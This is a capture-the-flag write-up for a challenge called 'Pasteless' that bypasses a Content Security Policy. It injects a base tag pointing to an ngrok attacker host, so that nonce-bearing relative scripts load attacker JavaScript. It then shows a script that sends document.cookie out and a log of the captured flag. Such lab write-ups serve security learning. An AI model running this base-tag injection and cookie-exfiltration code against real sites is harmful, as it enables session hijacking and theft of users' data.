# Pasteless

It was pretty obvious that we had to perform an XSS here, but the Content Security Policy had to be bypassed.

```markup
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; 
    script-src 'self' 'nonce-2ac41eb7-a3d1-4f8b-a06d-369e439ff08f'; 
    img-src 'self' ext.captcha.yandex.net">
```

I noticed that near the bottom of the page, relative JavaScript paths are used.

```markup
<script nonce="2ac41eb7-a3d1-4f8b-a06d-369e439ff08f" src="/static/jquery.min.js" crossorigin="anonymous"></script>
<script nonce="2ac41eb7-a3d1-4f8b-a06d-369e439ff08f" src="/static/bootstrap.min.js" crossorigin="anonymous"></script>
<script nonce="2ac41eb7-a3d1-4f8b-a06d-369e439ff08f" src="/static/page.js" crossorigin="anonymous"></script>
```

We can make use of the `nonce` in these script tags - these scripts will always be executed, because the CSP allows them based on their `nonce`.&#x20;

If we change the base URI of the page to our own attacker server, then these relative paths will now load scripts from our server, which is otherwise not possible due to the CSP.

`<base href=//351b-42-60-216-15.ngrok.io>`

The relative paths are now URLs under our attacker server, so if we simply host a file `/static/page.js` and enable CORS on our server, then we could execute arbitrary JS through this file.

In order to exfiltrate data, we still need to bypass the CSP once again. This is much simpler, now that we know the `nonce`. We could simply create a new script element and add the appropriate `nonce` obtained from the rest of the script tags. The script source can then be set to the data we want to exfiltrate.

```javascript
let script = document.createElement('script');
script.nonce = document.querySelector('script').nonce
script.src = `/?cookie=${document.cookie}`

document.body.appendChild(script);
```

We should now be able to receive the flag on our attacker server.

```
[2022-02-12T16:15:22.094Z]  "GET /?cookie=ctf-flag=yactf{h7ml_tAgs_423_b3au71ful_whAt_cAn_Go_wROng}
```
